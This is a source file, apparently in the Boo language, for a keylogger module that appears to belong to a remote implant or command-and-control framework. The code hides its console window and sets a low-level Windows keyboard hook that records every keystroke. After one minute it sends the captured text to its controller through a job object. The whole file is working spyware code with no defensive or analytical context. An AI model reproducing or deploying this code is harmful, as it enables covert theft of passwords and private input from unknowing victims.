import System
import System.Diagnostics
import System.Windows
import System.Windows.Forms
import System.Runtime.InteropServices
import System.IO
import System.Net
import System.Text
import System.Drawing
import System.Threading



public class InterceptKeys(Form):
    private static _job as duck
    private static final WH_KEYBOARD_LL = 13

    private static final WM_KEYDOWN = 256

    private static _proc as LowLevelKeyboardProc = HookCallback

    private static _hookID as IntPtr = IntPtr.Zero

    private static results = ''

    public def constructor(job as duck):
        _job = job
        Main()

    
    public static def upload():
        _job.SendJobResults(results);

    public static def Main():
        
        handle  = GetConsoleWindow()
        
        // Hide
        ShowWindow(handle, SW_HIDE)
        
        
        
        STAThread as Thread = Thread() do:
            Thread.CurrentThread.IsBackground = true
            Thread.Sleep((TimeSpan.FromMinutes(1).TotalMilliseconds cast int))
            upload()

        STAThread.SetApartmentState(ApartmentState.STA)
        STAThread.Start()
        
        _hookID = SetHook(_proc)
        Application.Run()
        UnhookWindowsHookEx(_hookID)
        
        

    
    private static def SetHook(proc as LowLevelKeyboardProc) as IntPtr:
        using curProcess = Process.GetCurrentProcess():
            using curModule = curProcess.MainModule:
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0)

    
    private callable LowLevelKeyboardProc(nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr
    
    private static def HookCallback(nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr:
        if (nCode >= 0) and (wParam == (WM_KEYDOWN cast IntPtr)):
            vkCode as int = Marshal.ReadInt32(lParam)
            results += (vkCode cast Keys)
        return CallNextHookEx(_hookID, nCode, wParam, lParam)

    
    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def SetWindowsHookEx(idHook as int, lpfn as LowLevelKeyboardProc, hMod as IntPtr, dwThreadId as uint) as IntPtr:
        pass

    
    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def UnhookWindowsHookEx(hhk as IntPtr) as bool:
        pass

    
    [DllImport('user32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def CallNextHookEx(hhk as IntPtr, nCode as int, wParam as IntPtr, lParam as IntPtr) as IntPtr:
        pass

    
    [DllImport('kernel32.dll', CharSet: CharSet.Auto, SetLastError: true)]
    private static def GetModuleHandle(lpModuleName as string) as IntPtr:
        pass

    
    [DllImport('kernel32.dll')]
    private static def GetConsoleWindow() as IntPtr:
        pass

    
    [DllImport('user32.dll')]
    private static def ShowWindow(hWnd as IntPtr, nCmdShow as int) as bool:
        pass

    
    private static final SW_HIDE = 0
    
public static def Start(job as duck):
    Application.Run(InterceptKeys(job))